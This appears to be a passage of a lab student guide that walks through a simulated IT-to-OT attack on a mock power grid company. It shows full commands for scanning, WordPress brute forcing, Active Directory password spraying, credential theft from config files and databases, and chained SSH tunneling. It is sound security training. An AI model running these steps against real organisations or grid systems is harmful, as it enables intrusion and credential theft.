{
  "title": "ICS Power Grid Defense Lab",
  "content_type": "student_guide",
  "body_markdown": "# ICS Power Grid Attack Exercise - Full IT-to-OT Kill Chain\n\nYour mission is to execute a complete IT-to-OT kill chain against Acme Widgets' electric power grid infrastructure. Starting from the external internet, you will compromise the corporate IT network, pivot through the IT/OT DMZ, and ultimately attack the industrial control systems managing power generation, transmission, and distribution.\n\nThis exercise follows a realistic adversary tradecraft path through a full Purdue Model (IEC 62443) architecture with 7 network zones, 23 VMs, and live ICS protocol simulators.\n\n**All VMs are accessed via browser-based VNC desktops** through the CYROID web interface. Click a VM's VNC icon to open its desktop, then use the terminal inside.\n\n## Purdue Model Overview\n\nThis lab implements the **Purdue Enterprise Reference Architecture** (IEC 62443), which segments industrial environments into hierarchical levels:\n\n| Level | Name | Purpose |\n|-------|------|---------|\n| L5 | Internet / Enterprise DMZ | External-facing, untrusted |\n| L4 | Enterprise / Corporate IT | Business systems, email, AD, web portals |\n| L3.5 | IT/OT DMZ | Boundary between IT and OT - data diodes, jump hosts, historian mirrors |\n| L3 | Operations / Site | Engineering workstations, process historians |\n| L2 | Supervisory | HMI panels, SCADA servers |\n| L1 | Basic Control | PLCs, RTUs, safety controllers |\n| L0 | Physical Process | Sensors, actuators, field devices |\n\nTraffic should flow **downward** through these levels with strict controls at each boundary. Your job is to find where those controls fail.\n\n## Lab Architecture\n\nYou are given the following information as your starting point - this simulates pre-engagement scoping information a red team would receive:\n\n- **Target Organization:** Acme Widgets (acmewidgets.local)\n- **Scope:** Full IT-to-OT assessment authorized\n- **Your starting position:** External attacker VM on the internet segment\n- **Known information:** The organization has a corporate web presence and manages regional power grid infrastructure\n\nThe lab network is organized as follows. Not all of this will be visible to you initially - part of the exercise is discovering this topology through reconnaissance.\n\n```\nL5 Internet        L4 Enterprise          L3.5 IT/OT DMZ       L3 Operations        L2 Supervisory       L1/L0 Process Control\n172.16.0.0/24      172.16.1.0/24          172.16.2.0/24        172.16.3.0/24        172.16.4.0/24        172.16.5.0/24\n\n[attacker .10]     [dc01 .10]             [jump-host .10]      [historian .10]      [hmi-sub .10]        [plc-sub-a .10] Modbus+ENIP\n                   [mail-srv .20]         [hist-mirror .20]    [eng-ws-ot .20]      [hmi-gen .20]        [plc-sub-b .20] Modbus\n                   [eng-ws .30]                                                     [hmi-grid .30]       [plc-gen .30]   EtherNet/IP\n                   [corp-web .40]                                                                        [plc-load .40]  Modbus\n               [ent-firewall .1]      [ot-firewall .254]                                                 [plc-safety .50] OPC UA\n                                                                                                         [rtu-dist .60]  Modbus\n```\n\n## Common ICS Protocols You'll Encounter\n\n| Protocol | Default Port | Authentication | Description |\n|----------|-------------|----------------|-------------|\n| Modbus TCP | 502 | None | Simple register-based read/write. No built-in security. |\n| EtherNet/IP (CIP) | 44818 | None | Allen-Bradley / Rockwell protocol for PLCs |\n| OPC UA | 4840 | Optional (often disabled) | Modern ICS protocol with node-tree structure |\n| DNP3 | 20000 | Optional | Distribution automation protocol |\n\nUnderstanding these protocols and their security (or lack thereof) is critical to the OT phases of this exercise.\n",
  "walkthrough_data": {
    "title": "ICS Power Grid Attack Exercise",
    "description": "Full IT-to-OT kill chain - compromise corporate IT, pivot through DMZ, and attack industrial control systems managing an electric power grid",
    "content_type": "student_guide",
    "version": "5.0",
    "tags": [
      "ics",
      "scada",
      "ot-security",
      "power-grid",
      "purdue-model",
      "red-team",
      "modbus",
      "ethernetip",
      "opcua",
      "mitre-ics",
      "active-directory",
      "wordpress",
      "credential-reuse"
    ],
    "phases": [
      {
        "id": "phase1",
        "name": "IT Reconnaissance",
        "steps": [
          {
            "id": "step1_1",
            "vm": "attacker",
            "title": "Establish Your Position and Discover the Network",
            "content": "Open the **attacker** VM via VNC. Before running any scans, you need to answer a fundamental question: *where am I, and what can I reach?*\n\nEvery penetration test starts with **situational awareness**. You wouldn't walk into a building and start opening random doors \u2014 you'd first look at the building directory, check which floor you're on, and see what hallways lead where. Network reconnaissance works the same way.\n\n### Step 1: Determine Your Own Network Position\n\nStart by examining your own network configuration:\n\n```bash\nip addr show eth0\nip route\n```\n\n**What to look for:**\n- Your IP address and subnet mask tell you which network you're on and how many hosts could be on it\n- Your default gateway (the `.1` address on most networks) is the router that connects you to other networks\n- The subnet mask (`/24` = 255.255.255.0) tells you the network boundary \u2014 hosts from `.1` to `.254` are on each `/24` segment\n\n> **Think about it:** If your IP is `172.16.0.10/24`, you're on the `172.16.0.0/24` network. Your default gateway at `172.16.0.1` is likely a firewall or router. What's on the *other side* of that gateway? In enterprise environments, the next network up is often `172.16.1.0/24`. This is how real attackers map network topology \u2014 incrementally, starting from what they know.\n\n### Step 2: Probe the Adjacent Network\n\nEnterprise networks typically use sequential subnets (172.16.0.x, 172.16.1.x, 172.16.2.x, etc.) or a predictable VLSM scheme. Since you're on the \"internet\" segment, the next subnet likely contains corporate/enterprise systems that are exposed through the perimeter firewall.\n\nScan the most likely enterprise range for common services:\n\n```bash\nnmap -Pn -sT -p 22,80,443,445,389,636,3389,8080 172.16.1.1-50 --open\n```\n\n**Why these specific ports?**\n- **22** (SSH) \u2014 Remote administration, common on Linux servers\n- **80/443** (HTTP/HTTPS) \u2014 Web applications, the most common attack surface\n- **445** (SMB) \u2014 Windows/Samba file sharing, indicates Active Directory environments\n- **389/636** (LDAP) \u2014 Directory services, confirms AD domain controller\n- **3389** (RDP) \u2014 Windows remote desktop\n- **8080** \u2014 Alternate HTTP, often development/admin interfaces\n\n**Why `-Pn`?** Many firewalled hosts don't respond to ICMP ping, so `-Pn` skips host discovery and scans every target. **Why `-sT`?** Full TCP connect scan \u2014 more reliable through firewalls than SYN scans.\n\nYou should discover at least two hosts with exposed services. Note their IPs, open ports, and what the port combination suggests about each host's role (e.g., 445+389 together strongly suggests a domain controller).\n\n**MITRE ATT&CK:** [T1046 - Network Service Scanning](https://attack.mitre.org/techniques/T1046/)"
          },
          {
            "id": "step1_2",
            "vm": "attacker",
            "title": "Enumerate the Web Application",
            "content": "From your nmap results, you should have found a host running HTTP on port 80. A web server on a corporate network is almost always worth investigating \u2014 it's the most common initial access vector in real-world breaches.\n\n### Step 1: Identify the Technology Stack\n\nBefore attacking anything, identify what you're dealing with:\n\n```bash\ncurl -s http://172.16.1.40 | grep '<title>'\n```\n\nThe page title should tell you this is an employee portal. But what CMS or framework is it running? Look for telltale signs:\n\n```bash\n# Check for WordPress-specific paths\ncurl -s -o /dev/null -w '%{http_code}' http://172.16.1.40/wp-login.php\ncurl -s -o /dev/null -w '%{http_code}' http://172.16.1.40/wp-admin/\n```\n\n> **Think about it:** A `200` or `302` response to `/wp-login.php` confirms WordPress. Every CMS has fingerprinting signatures like this \u2014 Drupal has `/user/login`, Joomla has `/administrator/`. Identifying the CMS immediately tells you what vulnerabilities and attack paths to research.\n\n### Step 2: Directory Enumeration\n\nWeb servers often host content that isn't linked from the main page. Directory brute-forcing reveals hidden paths. Rather than using a massive generic wordlist (like `common.txt` with 4,600+ entries), a smart approach is to build a **targeted list** based on what you already know:\n\n- You confirmed it's **WordPress** \u2014 so include WP-specific paths (`wp-admin`, `wp-content`, `wp-json`, `xmlrpc.php`)\n- It's a **corporate portal** \u2014 look for employee/HR/internal pages (`employees`, `staff`, `portal`, `intranet`)\n- Standard recon targets \u2014 backup files, config leaks, admin panels, API endpoints\n\n> **Think about it:** Why not just use a huge wordlist? In a real engagement, massive wordlists generate thousands of HTTP requests that are noisy (easy for defenders to detect) and slow. A targeted list of 50-80 entries finishes in seconds and focuses on high-value paths you actually care about. You can always expand to a larger wordlist later if the targeted scan doesn't find enough.\n\nCreate a focused wordlist:\n\n```bash\ncat > /tmp/dirs.txt << 'DIREOF'\nadmin\napi\nbackup\nbackups\ncgi-bin\nconfig\nconsole\ndashboard\ndb\ndocs\nemployees\nfeed\nhr\nimages\nintranet\nlogin\nmanager\nold\nphpmyadmin\nportal\nreadme.html\nrobots.txt\nserver-status\nsitemap.xml\nstaff\nuploads\nvpn\nwp-admin\nwp-config.php\nwp-content\nwp-cron.php\nwp-includes\nwp-json\nwp-login.php\nxmlrpc.php\n.env\n.git\n.htaccess\nDIREOF\n```\n\nRun gobuster with your targeted list:\n\n```bash\ngobuster dir -u http://172.16.1.40 -w /tmp/dirs.txt -q -t 10 2>/dev/null\n```\n\nLook for anything beyond the standard WordPress directories \u2014 employee pages, internal tools, or backup files are particularly interesting during a pentest.\n\n### Step 3: User Enumeration\n\nWordPress exposes a REST API by default that can reveal registered usernames. Most WordPress admins don't realize this endpoint exists:\n\n```bash\ncurl -s http://172.16.1.40/wp-json/wp/v2/users | python3 -m json.tool\n```\n\n> **Why this matters:** Usernames are half the puzzle for any credential attack. WordPress REST API user enumeration is one of the first things a real attacker checks \u2014 it's a built-in feature that many defenders forget to disable. Look for usernames that follow a corporate naming convention (e.g., `jsmith`, `mwilliams`) as these likely correspond to actual employees.\n\nAlso check if there's an employee directory page \u2014 organizations often expose more information than they realize:\n\n```bash\ncurl -s http://172.16.1.40/employees/ | grep -oE '[a-z]+@acmewidgets.local'\n```\n\nCollect all usernames and email addresses you find. You'll use these in the next phase.\n\n**MITRE ATT&CK:** [T1592 - Gather Victim Host Information](https://attack.mitre.org/techniques/T1592/), [T1589 - Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589/)"
          }
        ]
      },
      {
        "id": "phase2",
        "name": "WordPress Credential Attack",
        "steps": [
          {
            "id": "step2_1",
            "vm": "attacker",
            "title": "Brute Force WordPress Login",
            "content": "You now have confirmed usernames from a WordPress site. The next logical step is to test whether any of these accounts use weak or guessable passwords.\n\n### Building a Targeted Password List\n\nGeneric wordlists (like `rockyou.txt` with 14 million entries) would take forever and generate massive noise. A skilled attacker builds a **targeted list** based on what they know about the organization:\n\n- **Seasonal patterns:** `Summer2024`, `Winter2024`, `Spring2024` \u2014 extremely common in corporate environments where passwords expire quarterly\n- **Company name variants:** `Acme2024`, `Acme2024!`, `AcmeWidgets1` \u2014 users often incorporate their employer's name\n- **Common corporate defaults:** `Welcome123`, `Password1`, `Changeme1` \u2014 often set by helpdesks for new accounts\n\n> **Think about it:** In a real engagement, you'd also check for passwords leaked in public breaches (using tools like `dehashed` or `haveibeenpwned`), social media clues (sports teams, pet names), and patterns from any password policy information gathered during recon.\n\nCreate your targeted lists:\n\n```bash\ncat > /tmp/users.txt << 'EOF'\nadmin\njsmith\nmwilliams\nEOF\n\ncat > /tmp/passwords.txt << 'EOF'\nadmin\npassword\nPassword1\nSummer2024\nWinter2024\nWelcome123\nAcme2024\nAcme2024!\nEOF\n```\n\n### Choosing the Attack Vector\n\nWordPress offers multiple authentication endpoints. Before attacking, check which ones are available:\n\n```bash\n# Check if XML-RPC is enabled (a commonly overlooked attack surface)\ncurl -s -X POST http://172.16.1.40/xmlrpc.php \\\n  -d '<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>' | head -5\n```\n\nIf XML-RPC responds, it's an alternative brute-force target. But the standard `/wp-login.php` form is the most straightforward:\n\n```bash\nhydra -L /tmp/users.txt -P /tmp/passwords.txt 172.16.1.40 \\\n  http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect\" \\\n  -t 4 -f\n```\n\n**Understanding the hydra command:**\n- `-L` / `-P` \u2014 Username and password list files\n- `http-post-form` \u2014 Attack type: HTTP POST form submission\n- The three colon-separated fields: `login_path:post_body:failure_string`\n  - `log=^USER^&pwd=^PASS^` \u2014 The POST parameters (found by inspecting the login form's HTML)\n  - `incorrect` \u2014 Text that appears on **failed** login. Hydra uses this to identify which attempts succeed\n- `-t 4` \u2014 Only 4 threads to avoid overwhelming the server or triggering lockouts\n- `-f` \u2014 Stop after finding the first valid credential\n\nHydra should find at least one valid credential pair. Verify it actually works:\n\n```bash\ncurl -s -X POST 'http://172.16.1.40/wp-login.php' \\\n  -d 'log=jsmith&pwd=Summer2024&wp-submit=Log+In' \\\n  -c /tmp/wp_cookies.txt -L | grep -o 'Dashboard'\n```\n\nIf you see \"Dashboard\" in the output, you've successfully authenticated.\n\n**MITRE ATT&CK:** [T1110.001 - Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)"
          }
        ]
      },
      {
        "id": "phase3",
        "name": "Active Directory Enumeration",
        "steps": [
          {
            "id": "step3_1",
            "vm": "attacker",
            "title": "Enumerate Active Directory",
            "content": "Remember the other host from your initial nmap scan \u2014 the one with SMB (445) and LDAP (389) open? That port combination almost certainly indicates an **Active Directory Domain Controller**.\n\n> **Why does this matter?** Active Directory is the backbone of Windows enterprise networks. If you can enumerate or compromise AD, you potentially gain access to every system in the organization \u2014 including systems in the OT network if credential reuse exists.\n\n### Identify the Domain\n\nUse SMB enumeration to confirm the domain name and check what's accessible:\n\n```bash\nnxc smb 172.16.1.10\n```\n\n**What to look for in the output:**\n- **Domain name** \u2014 This tells you the AD realm (e.g., `ACMEWIDGETS`)\n- **Signing** \u2014 Whether SMB signing is required (affects relay attacks)\n- **SMBv1** \u2014 If enabled, may be vulnerable to EternalBlue-class exploits\n\nFor deeper enumeration:\n\n```bash\nenum4linux -a 172.16.1.10 2>&1 | grep -E '(Domain Name|Domain Sid|allows sessions)'\n```\n\n> **Think about it:** Many AD environments allow null (anonymous) sessions for compatibility reasons. This is a significant misconfiguration \u2014 it lets unauthenticated attackers enumerate users, groups, and policies.\n\n**MITRE ATT&CK:** [T1018 - Remote System Discovery](https://attack.mitre.org/techniques/T1018/), [T1087.002 - Account Discovery: Domain Account](https://attack.mitre.org/techniques/T1087/002/)"
          },
          {
            "id": "step3_2",
            "vm": "attacker",
            "title": "Password Spraying Against AD",
            "content": "You have WordPress credentials from Phase 2, and you've identified an Active Directory domain. Now ask yourself: **would these employees use the same password for their Windows domain account as their WordPress account?**\n\nThe answer, overwhelmingly in the real world, is *yes*. Credential reuse between systems is one of the most common security failures, especially when both systems are managed by the same IT department.\n\n### What is Password Spraying?\n\nUnlike brute-forcing (trying many passwords against one account), **password spraying** tries a small number of passwords against many accounts. This approach:\n- Avoids account lockout thresholds (typically 3-5 attempts)\n- Is harder to detect than traditional brute force\n- Is extremely effective when users reuse passwords\n\nTest each WordPress credential against the AD domain:\n\n```bash\n# Test jsmith's WordPress password against AD\nnxc smb 172.16.1.10 -u jsmith -p 'Summer2024' -d ACMEWIDGETS\n```\n\nA `[+]` in the output means the credentials are valid on Active Directory. If jsmith's password works, try the other accounts you discovered:\n\n```bash\nnxc smb 172.16.1.10 -u mwilliams -p 'Welcome123' -d ACMEWIDGETS\n```\n\n> **Think about it:** You found a `svc_backup` account during web enumeration. Service accounts often have predictable passwords based on their function. What would you guess? Try patterns like `Backup2024`, `backup123`, `Svc_backup1`:\n\n```bash\nnxc smb 172.16.1.10 -u svc_backup -p 'Backup2024' -d ACMEWIDGETS\n```\n\nWith valid domain credentials, you can enumerate further \u2014 check what SMB shares are accessible:\n\n```bash\nsmbclient -L //172.16.1.10 -U 'ACMEWIDGETS\\jsmith%Summer2024'\n```\n\n> **Key takeaway for defenders:** This entire attack chain \u2014 from WordPress to AD \u2014 was enabled by a single root cause: **credential reuse**. If employees used different passwords for different systems (or if MFA was enforced), the WordPress compromise would have been contained to WordPress.\n\n**MITRE ATT&CK:** [T1110.003 - Brute Force: Password Spraying](https://attack.mitre.org/techniques/T1110/003/), [T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/)"
          }
        ]
      },
      {
        "id": "phase4",
        "name": "Credential Reuse & Data Exfiltration",
        "steps": [
          {
            "id": "step4_1",
            "vm": "attacker",
            "title": "Pivot to the Corporate Web Server",
            "content": "You've confirmed that jsmith's credentials work across multiple systems. Now think about *what else* those credentials might unlock.\n\nFrom your Phase 1 nmap scan, you know the corporate web server has **SSH (port 22)** open in addition to HTTP. SSH gives you a full shell on the machine \u2014 far more access than the WordPress admin panel.\n\n> **Think about it:** Why would an attacker prefer SSH access over just having WordPress admin? Consider: WordPress admin lets you modify the website, but a shell lets you read configuration files, access databases, enumerate internal networks, and use the host as a pivot point for further attacks.\n\nTest whether the WordPress credentials also work for SSH:\n\n```bash\nhydra -l jsmith -p 'Summer2024' 172.16.1.40 ssh -t 4\n```\n\nIf hydra confirms the credentials work, SSH in:\n\n```bash\nssh jsmith@172.16.1.40\n# Password: Summer2024\n```\n\n### Hunt for Sensitive Data\n\nOnce on a web server, the first thing a penetration tester checks is the **application configuration**. Web applications store database credentials in config files, and these credentials are almost always in plaintext:\n\n```bash\ncat /var/www/html/wp-config.php | grep -E 'DB_(USER|PASSWORD|HOST)'\n```\n\n> **Why wp-config.php?** Every WordPress installation stores its database connection details here. The path `/var/www/html/` is the standard Apache/Nginx document root on Debian/Ubuntu. Other frameworks have their own equivalents \u2014 `.env` files for Laravel/Node.js, `settings.py` for Django, `application.properties` for Spring Boot.\n\nRecord the database credentials you find \u2014 you'll use them next.\n\n**MITRE ATT&CK:** [T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/), [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)"
          },
          {
            "id": "step4_2",
            "vm": "attacker",
            "title": "Extract VPN Credentials from the Database",
            "content": "You now have database credentials from `wp-config.php`. The WordPress database may contain more than just blog posts \u2014 custom plugins and employee portals often store sensitive data in additional tables.\n\n### Enumerate the Database\n\nUsing the credentials from wp-config.php, connect to the database and explore:\n\n```bash\n# List all tables \u2014 look for anything beyond standard WordPress tables (wp_posts, wp_users, etc.)\nmysql -u wp_user -p'Acme2024!' wordpress \\\n  -e 'SHOW TABLES;'\n```\n\n> **Think about it:** Standard WordPress tables all start with `wp_` followed by common names (posts, users, options, comments, etc.). Any table that doesn't match this pattern \u2014 especially ones containing words like \"employee\", \"vpn\", \"credentials\", or \"internal\" \u2014 likely belongs to a custom plugin and is worth investigating.\n\nOnce you identify an interesting table, dump its contents:\n\n```bash\nmysql -u wp_user -p'Acme2024!' wordpress \\\n  -e 'SELECT employee_id, full_name, department, vpn_username, vpn_password FROM wp_acme_employees;'\n```\n\nYou should find employee records with plaintext VPN credentials. This is unfortunately realistic \u2014 many internal web applications store credentials in plaintext because developers assume the internal network is \"trusted.\"\n\n> **Why are VPN credentials so valuable?** VPN credentials typically grant access to internal network segments that aren't reachable from the internet. In an ICS environment, this could mean access to the IT/OT DMZ or even the operations network. This is often the bridge from IT compromise to OT access.\n\nWhen you're done, exit the SSH session:\n```bash\nexit\n```\n\n**MITRE ATT&CK:** [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/), [T1005 - Data from Local System](https://attack.mitre.org/techniques/T1005/)"
          }
        ]
      },
      {
        "id": "phase5",
        "name": "Network Pivoting - SSH Tunneling",
        "steps": [
          {
            "id": "step5_1",
            "vm": "attacker",
            "title": "Why You Need a Tunnel",
            "content": "You've harvested credentials and compromised the corporate web server. The next target is the OT network \u2014 but can you actually reach it from here?\n\n### Test Your Reach\n\nTry to ping hosts on the IT/OT DMZ and operations networks:\n\n```bash\nping -c 1 -W 2 172.16.2.10\nping -c 1 -W 2 172.16.3.20\n```\n\nBoth should **time out**. The enterprise perimeter firewall blocks direct access from the internet segment (172.16.0.x) to the DMZ (172.16.2.x) and OT networks (172.16.3.x+). This is the firewall doing its job.\n\n> **Think about it:** If you can't reach the DMZ directly, how would a real attacker get there? The answer: **pivot through a host that CAN reach the next network.** You already have SSH access to corp-web (172.16.1.40), and corp-web sits on the enterprise network. The enterprise firewall allows enterprise hosts to reach the DMZ \u2014 that's by design, so business systems can communicate with IT/OT boundary services.\n\n### SSH Tunneling \u2014 Your Most Important Offensive Tool\n\nSSH tunneling (port forwarding) lets you route network traffic through an SSH connection. There are three types, and you **need to understand all three:**\n\n| Type | Flag | What It Does | Analogy |\n|------|------|-------------|---------|\n| **Local** (`-L`) | `-L 2222:target:22` | \"Listen on MY port 2222. Anything that connects gets forwarded through the SSH server to target:22.\" | Building a secret passageway from your room to a locked room, going through a hallway you control |\n| **Dynamic** (`-D`) | `-D 9050` | \"Listen on MY port 9050 as a SOCKS proxy. ANY connection through it gets forwarded through the SSH server.\" | Building a passageway that can reach ANY room through the hallway |\n| **Remote** (`-R`) | `-R 8888:myhost:80` | \"Listen on the SSH SERVER's port 8888. Anything that connects gets forwarded BACK to my machine on port 80.\" | Letting someone in the locked room reach back to your room |\n\n**Key concept:** The SSH server acts as a **relay**. `-L` and `-D` let you reach things the server can reach. `-R` lets the server reach things you can reach.\n\n### Set Up SSH Keys\n\nGenerate an SSH key and deploy it to corp-web. Key-based auth enables backgrounded tunnels without password prompts:\n\n```bash\n# Generate an SSH key pair (press Enter for defaults)\nssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N '' -q\n\n# Copy your public key to corp-web (enter jsmith's password: Summer2024)\nssh-copy-id -o StrictHostKeyChecking=no jsmith@172.16.1.40\n```\n\n### Build Tunnel 1: SOCKS Proxy Through Corp-Web (`-D`)\n\nThis creates a SOCKS5 proxy that can route traffic to **anything corp-web can reach**:\n\n```bash\nssh -D 9050 -f -N -o StrictHostKeyChecking=no jsmith@172.16.1.40\n```\n\n**Understanding each flag:**\n- **`-D 9050`** \u2014 Create a SOCKS5 proxy on local port 9050\n- **`-f`** \u2014 Background the SSH process after authentication\n- **`-N`** \u2014 No remote command \u2014 tunnel only, not a shell\n\nVerify it's running:\n\n```bash\nss -tlnp | grep 9050\n```\n\nHere's what you've built:\n\n```\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     SSH tunnel      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   attacker   \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u25b6\u2502  corp-web    \u2502\u2500\u2500\u2192 Can reach DMZ (172.16.2.x)\n\u2502 SOCKS :9050  \u2502   (encrypted)      \u2502 172.16.1.40  \u2502\u2500\u2500\u2192 Can reach Enterprise (172.16.1.x)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nAny traffic sent to localhost:9050 exits from corp-web's network position\n```\n\n**MITRE ATT&CK:** [T1572 - Protocol Tunneling](https://attack.mitre.org/techniques/T1572/), [T1090 - Proxy](https://attack.mitre.org/techniques/T1090/)"
          },
          {
            "id": "step5_2",
            "vm": "attacker",
            "title": "Route Traffic Through the Tunnel with Proxychains",
            "content": "Now you have a SOCKS proxy running on port 9050 that tunnels through corp-web. But most command-line tools (nmap, curl, etc.) don't natively support SOCKS proxies. That's where **proxychains** comes in.\n\n### What is Proxychains?\n\nProxychains intercepts TCP connections from any program and routes them through a proxy server. It works by hooking the `connect()` system call \u2014 so any tool that makes TCP connections can be transparently tunneled.\n\n### Configure Proxychains\n\nUpdate the proxychains configuration to use your SSH tunnel:\n\n```bash\n# Write a proxychains config pointing to your tunnel\ncat > ~/proxychains.conf << 'PCEOF'\nstrict_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\nsocks5 127.0.0.1 9050\nPCEOF\n```\n\n### Test the Tunnel\n\nNow verify you can reach the DMZ through your tunnel:\n\n```bash\n# This should now work \u2014 traffic goes: attacker -> corp-web -> DMZ\nproxychains4 -q -f ~/proxychains.conf bash -c 'echo | nc -w3 172.16.2.10 22'\n```\n\nIf you see an SSH banner (like `SSH-2.0-...`), your tunnel is working \u2014 you're reaching the jump-host's SSH service through corp-web.\n\nTry reaching the historian mirror API in the DMZ:\n\n```bash\nproxychains4 -q -f ~/proxychains.conf curl -s http://172.16.2.20:8080/api/plcs\n```\n\n> **Think about it:** You're now accessing the DMZ from the attacker VM, even though the firewall blocks direct connections. From a defender's perspective, all this traffic appears as a single SSH session from the internet to corp-web \u2014 the tunneled traffic is encrypted inside that SSH connection. This is why SSH-based pivoting is so effective and hard to detect.\n\n**Important:** From this point forward, any command that needs to reach the DMZ or OT networks must go through your tunnel using `proxychains4 -q` as a prefix. The `-q` flag suppresses noisy proxy connection messages.\n\n**MITRE ATT&CK:** [T1090.001 - Proxy: Internal Proxy](https://attack.mitre.org/techniques/T1090/001/)"
          },
          {
            "id": "step5_3",
            "vm": "attacker",
            "title": "Extend the Tunnel Chain \u2014 Local Port Forwarding (-L)",
            "content": "Your SOCKS proxy through corp-web lets you reach the DMZ. But the **OT operations network** (172.16.3.x) is another firewall hop away \u2014 corp-web can't reach it directly. You need to chain through the **jump-host** (172.16.2.10) in the DMZ.\n\nThis is where **local port forwarding (`-L`)** becomes essential. Instead of a generic SOCKS proxy, `-L` creates a **specific tunnel to a specific target** through the SSH server.\n\n### Build Tunnel 2: Reach Jump-Host's SSH (`-L`)\n\nCreate a local port forward from your attacker through corp-web to jump-host's SSH port:\n\n```bash\nssh -L 2222:172.16.2.10:22 -f -N -o StrictHostKeyChecking=no jsmith@172.16.1.40\n```\n\n**Breaking this down piece by piece:**\n- **`-L 2222:172.16.2.10:22`** \u2014 \"Listen on my local port **2222**. Forward connections through corp-web to **172.16.2.10** (jump-host) port **22** (SSH).\"\n- **`jsmith@172.16.1.40`** \u2014 The SSH server doing the relaying (corp-web)\n\n```\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     SSH tunnel      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   attacker   \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u25b6\u2502  corp-web    \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502  jump-host   \u2502\n\u2502  :2222 \u2500\u2500\u2500\u2500\u2500\u2500\u2502\u2500\u2500\u2500\u2500\u2500 forwarded \u2500\u2500\u2500\u2500\u25b6\u2502 172.16.1.40  \u2502\u2500\u2500 to \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 172.16.2.10  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     (encrypted)     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  (corp-web     \u2514\u2500\u2500\u2500\u2500\u2500\u2500:22\u2500\u2500\u2500\u2500\u2500\u2518\n                                                      connects to\nConnecting to localhost:2222 on attacker              jump-host:22)\nis the same as connecting to jump-host:22\n```\n\n### Test It \u2014 SSH to Jump-Host Through the Tunnel\n\n```bash\nssh -o StrictHostKeyChecking=no -p 2222 jsmith@localhost 'hostname && ip addr show eth0 | grep \"inet \"'\n```\n\nYou should see `jump-host` and an IP in the `172.16.2.x` range. **You just SSH'd to a host two networks away by connecting to your own localhost:2222.**\n\n> **Think about it:** From a network perspective, the attacker never directly contacted jump-host. The only visible connection is attacker \u2192 corp-web on port 22. Corp-web then makes a *separate* connection to jump-host:22. Defenders monitoring the DMZ would see corp-web connecting to jump-host \u2014 which looks like normal admin traffic.\n\n### Deploy Your SSH Key to Jump-Host\n\n```bash\nssh-copy-id -o StrictHostKeyChecking=no -p 2222 jsmith@localhost\n```\n\n### Build Tunnel 3: Reach Eng-WS-OT Through the Chain (`-L` through `-L`)\n\nNow the critical step \u2014 chain a *second* local port forward through the first one. This reaches the OT engineering workstation (172.16.3.20) on the **Operations network**, two firewalls deep:\n\n```bash\nssh -L 3333:172.16.3.20:22 -f -N -o StrictHostKeyChecking=no -p 2222 jsmith@localhost\n```\n\n**Breaking this down:**\n- **`-p 2222 jsmith@localhost`** \u2014 Connect to our *existing tunnel* (which reaches jump-host)\n- **`-L 3333:172.16.3.20:22`** \u2014 \"Through jump-host, forward my local port **3333** to **172.16.3.20** (eng-ws-ot) port **22**.\"\n\n```\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  tunnel 1   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  tunnel 2   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510               \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 attacker  \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u25b6\u2502 corp-web  \u2502\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u25b6\u2502jump-host \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502eng-ws-ot \u2502\n\u2502 :2222 \u2500\u2500\u2500\u2500\u2502\u2500 forward \u2500\u2500\u25b6\u2502  :22     \u2500\u2502\u2500 forward \u2500\u2500\u25b6\u2502  :22     \u2502\u2500\u2500 to \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502  :22     \u2502\n\u2502 :3333 \u2500\u2500\u2500\u2500\u2502\u2500 forward \u2500\u2500\u25b6\u2502          \u2500\u2502\u2500 forward \u2500\u2500\u25b6\u2502         \u2500\u2502\u2500\u2500 to 